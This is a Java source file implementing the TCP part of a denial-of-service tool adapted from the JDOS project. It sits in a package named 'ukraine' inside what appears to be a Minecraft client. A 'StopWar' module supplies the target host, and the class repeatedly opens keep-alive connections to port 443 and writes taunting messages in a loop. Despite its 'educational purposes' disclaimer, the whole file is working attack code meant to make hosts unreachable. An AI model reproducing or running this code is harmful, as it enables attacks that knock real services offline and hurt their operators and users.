/*
 * This program was written by Tobias Schmidradler (schmidi000)
 * and published under the MIT License.
 * 
 * What kind of program is this?
 * This is a program for performing a Distributed Denial of Serivce (DDOS).
 * With a DDOS you could make a host in the network unreachable.
 *
 * 
 * All rights are reserved.
 * 
 * NOTE: 
 * ------------------------------------------------------------------------------------------
 * This program is only for educational purposes!
 * You use this on your own risk. 
 * Distributed Denial of Service attacks are illegal, you could go to jail for this.
 * ------------------------------------------------------------------------------------------
 * 
 * I am liable for nothing!
 *
 * Link: https://github.com/schmidi000/JDOS
 * E-Mail: tobias.schmidradler@gmail.com
 * Website: www.straim.com
 * Copyright (c) 2015
 */
package me.offeex.bloomware.api.ukraine.interfaces;

import me.offeex.bloomware.Bloomware;
import me.offeex.bloomware.client.command.CommandManager;
import me.offeex.bloomware.client.module.modules.extension.StopWar;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

/**
 * This is the TCP implementation of the DDOS.
 * @author Tobias
 * 
 * Last changed: 13.05.2015
 */
public abstract class TCP extends DDOS {
    /**
     * Instance of the current socket.
     */
    private Socket socket;
    
    public TCP() {
        super();
    }
    
    /**
     * This is the "main" method.
     * The whole action happens here.
     *  - Open the socket
     *  - Connect the socket
     *  - Write something to the socket
     *  - Close the socket
     */
    @Override
    public void run() {
        createSocket();
        connectToSocket();
        while(!Thread.currentThread().isInterrupted() && (socket.isConnected() && !socket.isClosed())) {
            writeLineToSocket("We do a little trolling :^)");
            CommandManager.addChatMessage("We do a little trolling =  )");
            try {
                StopWar module = Bloomware.moduleManager.getModule(StopWar.class);
                Thread.sleep((long) module.delay.getValue());
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            }
        }
        closeSocket();
    }
    
    /**
     * This method creates the socket.
     */
    protected void createSocket() {
        StopWar module = Bloomware.moduleManager.getModule(StopWar.class);
        setAddress(new InetSocketAddress(module.selected.getSelectedStr(), 443));
        socket = new Socket();
        try {
            socket.setKeepAlive(true);
            socket.setSoTimeout((int) (module.timeOut.getValue() * 1000));
        } catch (SocketException ex) {
            ex.printStackTrace();
        }
    }
    
    /**
     * This method writes something (Protocol dependent) to the socket.
     * @param message 
     */
    public abstract void writeLineToSocket(String message);
    
    protected void connectToSocket() {
        try {
            if(socket != null) socket.connect(getAddress());
        } catch(UnknownHostException ex) {
            CommandManager.addChatMessage("Error: Host "+getAddress()+" doesn´t exist!");
            ex.printStackTrace();
        } catch(SocketException ex) {
            CommandManager.addChatMessage("Error while creating or accessing a Socket!");
            closeSocket();
            ex.printStackTrace();
        } catch (IOException ex) {
            CommandManager.addChatMessage("Error while connecting a Socket!");
            ex.printStackTrace();
        }
    }
    
    /**
     * Close the socket
     */
    protected void closeSocket() {
        try {
            if(socket != null && !socket.isClosed() && socket.isBound()) {
                socket.close();
            }
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    /**
     * Get the socket
     * @return 
     */
    public Socket getSocket() {
        return socket;
    }

    /**
     * Set the socket
     * @param socket 
     */
    public void setSocket(Socket socket) {
        this.socket = socket;
    }
}
